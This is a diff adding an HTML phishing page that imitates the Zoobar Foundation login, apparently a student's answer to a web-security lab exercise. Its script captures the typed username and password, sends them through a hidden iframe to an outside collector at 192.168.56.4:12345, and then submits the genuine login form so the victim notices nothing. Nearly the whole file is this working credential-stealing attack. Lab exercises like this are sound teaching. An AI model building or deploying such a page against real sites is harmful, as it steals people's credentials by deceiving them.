@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
+    <title>Login - Zoobar Foundation</title>
+    <script>
+      function isLogin() {
+        document.querySelector('input[name="submit_login"]').addEventListener("click", send, false);
+        if (typeof myZoobars === "undefined") {
+          document.getElementById("iframe").addEventListener("load", forwarding, false);
+        }
+        else {
+          window.location.replace("./answer-2.html");
+        }
+      }
+
+      function send(e) {
+        e.preventDefault();
+        var user = document.getElementsByName("login_username")[0].value;
+        var pass = document.getElementsByName("login_password")[0].value;
+        r=Math.random();
+        r=Math.floor(r*1000);
+        document.getElementById("iframe").src = "http://192.168.56.4:12345/?payload="+user+","+pass+"&roll=15111038&random="+r;
+      }
+
+      function forwarding() {
+        document.querySelector('input[name="submit_login"]').removeEventListener("click", send, false);
+        document.querySelector('input[name="submit_login"]').click();
+      }
+    </script>
+  </head>
+  <body onload="isLogin();">
+    <script type="text/javascript" src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
+    <iframe style="visibility:hidden; height:0; width:0; position:absolute" name="iframe" id="iframe"></iframe>
+    <h1><a href="#">Zoobar Foundation for Inquisitive Thinking</a></h1>
+    <h2>Supporting the best thinkers of the 21st-century</h2>
+    <div id="login" class="centerpiece">
+      <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
+        <table>
+          <tr>
+            <td>Username:</td>
+            <td><input type="text" name="login_username" size="20" autocomplete="off" value=""></td>
+          </tr>
+          <tr>
+            <td>Password:</td>
+            <td colspan=2>
+              <input type="password" name="login_password" size=20 autocomplete="off">
+              <input type="submit" name="submit_login" value="Log in">
+              <input type="submit" name="submit_registration" value="Register">
+            </td>
+          </tr>
+        </table>
+        <input type="hidden" name="nexturl" value="/zoobar/index.cgi/">
+      </form>
+    </div>
+    <div class="footer warning"></div>
+    <script>document.loginform.login_username.focus();</script>
+  </body>
+</html>
